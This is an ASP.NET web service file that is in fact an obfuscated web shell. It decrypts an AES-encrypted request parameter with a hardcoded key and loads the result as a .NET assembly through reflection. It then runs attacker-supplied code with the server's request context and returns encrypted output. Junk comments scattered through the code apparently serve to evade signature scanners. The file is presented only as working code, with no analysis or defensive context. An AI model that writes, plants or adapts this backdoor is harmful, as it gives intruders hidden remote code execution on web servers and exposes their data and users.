<%@ WebService Language = "CS" Class="WebServicetest" %> public class WebServicetest : System.Web.Services.WebService { [System.Web.Services.WebMethod(EnableSession = true)] public string in_security(string in_security) {System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder(); try { string key = "7deaa770de410546"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes("in_security" + key))).Replace("-", "");byte[] data = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(in_security));System.Security.Cryptography.RijndaelManaged rijndael = new System.Security.Cryptography.RijndaelManaged();byte[] keyBytes = System.Text.Encoding.Default.GetBytes(key);data = rijndael./*Z#£¤h*u@!h73E4nNdo3*/@CreateDecryptor(keyBytes, keyBytes).TransformFinalBlock(data, 0, data.Length);if (Context.Session["loadE771"] == null) { Type assemblyType = typeof(System.Reflection.Assembly);System.Reflection.MethodInfo loadMethod = assemblyType.GetMethod("Load", new System.Type[] { typeof(byte[]) });Context.Session["loadE771"] = (System.Reflection.Assembly)loadMethod.Invoke(null, new object[] { data });} else { object o = ((System.Reflection.Assembly)Context.Session["loadE771"]).CreateInstance("LY"); System.IO.MemoryStream outStream = new System.IO.MemoryStream(); o.Equals(/*Z#£¤h*u@!h73E4nNdo3*/@outStream);o.Equals(/*Z#£¤h*u@!h73E4nNdo3*/@Context);  o.Equals(/*Z#£¤h*u@!h73E4nNdo3*/@data); o.ToString(); byte[] r = outStream.ToArray(); stringBuilder.Append(md5.Substring(0, 16)); stringBuilder.Append(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));stringBuilder.Append(md5.Substring(16)); } } catch (System.Exception) { } return stringBuilder.ToString(); }}